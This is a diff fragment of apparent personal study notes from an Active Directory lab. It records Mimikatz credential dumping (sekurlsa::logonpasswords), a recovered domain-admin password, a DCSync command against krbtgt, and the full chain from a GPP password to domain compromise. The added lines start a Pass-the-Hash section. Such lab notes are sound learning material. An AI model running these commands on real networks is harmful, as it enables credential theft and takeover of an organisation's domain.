@@ -352,3 +352,6 @@ Primary:WDigest *
 * **Tasks 7 and 8**: `xfreerdp /v:10.102.9.46 /u:NewAdmin /p:PasswordInGPPIsNotSafe /dynamic-resolution +clipboard +drives /drive:share,/home/kali`. Used `privilege::debug` and then `sekurlsa::logonpasswords` and found j.russ's password, which was `fV#8zB2H@7xC6Q!PjuZ&JLqX`. j.russ was a domain admin - so this is the jackpot!
 * Next tasks was a DCSync attack, which I did with `lsadump::dcsync /user:ORCHID\krbtgt`. I had to double check the FQDN name with `systeminfo | findstr /B /C:"Domain"`.
 * The overall flow of the attack was using `get-GPPPassword.ps1` on the original target, `m.gibbs` --> receive username `NewAdmin` and password `PasswordInGPPIsNotSafe` from GPPPassword.ps1 --> log into New Admin --> run `sekurlsa::logonpasswords` and get j.russ, who is a DA --> connect as j.russ, run Mimikatz --> `lsadump::dcsync /user:ORCHID\krbtgt` for DCSync attack. 
+
+# Pass-the-Hash
+* PTH is a credential theft and lateral movement technique that involves stealing a user's hash password and using it to authenticate to other machines or services within a network. 
